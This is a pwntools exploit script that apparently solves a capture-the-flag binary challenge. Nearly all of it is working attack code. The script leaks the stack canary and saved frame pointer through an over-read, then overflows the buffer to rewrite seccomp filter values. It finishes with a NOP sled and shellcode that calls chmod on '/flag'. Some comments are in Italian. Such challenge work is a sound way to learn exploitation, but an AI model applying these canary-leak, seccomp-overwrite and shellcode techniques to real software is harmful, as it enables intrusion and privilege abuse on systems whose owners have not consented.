from pwn import *


exe = context.binary = ELF(args.EXE or '/challenge/toddlerone-level-6-0')


def start(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

# Canary Leak
io.recvuntil(b'size: ')
offset_canary = 88  # rbp-24 (not def position)
io.sendline(str(offset_canary+1).encode())

io.recvuntil(b'bytes)!\n')
payload = b'aREPEATb' + b'A' * (offset_canary+1-8)
io.send(payload)

io.recvuntil(payload)
canary = u64(io.recv(7).rjust(8, b'\x00'))
print(f'canary: {hex(canary)}')

# Saved Main RBP Leak
io.recvuntil(b'size: ')
offset_rbp = 112
io.sendline(str(offset_rbp).encode())

io.recvuntil(b'bytes)!\n')
payload = b'aREPEATb' + b'A' * (offset_rbp-8)
io.send(payload)

io.recvuntil(payload)
rbp = u64(io.recvline(False).ljust(8, b'\x00'))
print(f'rbp: {hex(rbp)}')

assert hex(rbp) != '0x0'

# OverWrite SecComp Rules
write_syscall_num = 1
chmod_syscall_num = 90

io.recvuntil(b'size: ')

'''
value_to_push = hex(u64(b'/flag'.ljust(8, b'\x00')))
print(value_to_push)
'''

# Necessario inserire prima il valore in un reg (prima di pusharlo sullo stack) dato che il valore è > 32 bit (4 Byte)
context.arch = 'amd64'
shellcode = asm(
"""
mov rax, 0x0067616c662f
push rax
mov rdi, rsp
mov rax, 90
mov rsi, 4
syscall
""")
offset_sec_comp_rules = 72  # rbp-40 (not def position)
payload = b'A' * (offset_sec_comp_rules) + p32(write_syscall_num) + p32(chmod_syscall_num) + b'B' * 8 + p64(canary) + b'C' * 24 + p64(rbp) + b'\x90' * 500 + shellcode
io.sendline(str(len(payload)).encode())

io.recvuntil(b'bytes)!\n')
io.send(payload)

io.interactive()
print(f"cmd exe: chmod('/flag', 4)")